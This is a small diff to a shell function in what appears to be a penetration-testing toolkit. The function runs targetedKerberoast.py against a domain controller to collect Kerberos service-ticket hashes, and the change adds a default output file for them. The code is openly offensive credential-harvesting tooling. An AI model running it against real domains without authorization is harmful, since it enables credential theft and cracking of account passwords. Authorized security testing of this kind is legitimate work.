@@ -332,6 +332,9 @@ target_kerberoast() {
         echo "DC IP address is not set. Please set it before running"
         return 1
     fi
+    if [[ -z $hash_file ]]; then
+        hash_file="hashes.$target_user"
+    fi
     pushd "$targetedKerberoast_dir" || exit 1
     python3 targetedKerberoast.py -v -d "$domain" -u "$username" -p "$password" --dc-ip "$dc_ip" -o "$hash_file"
     popd || exit 1
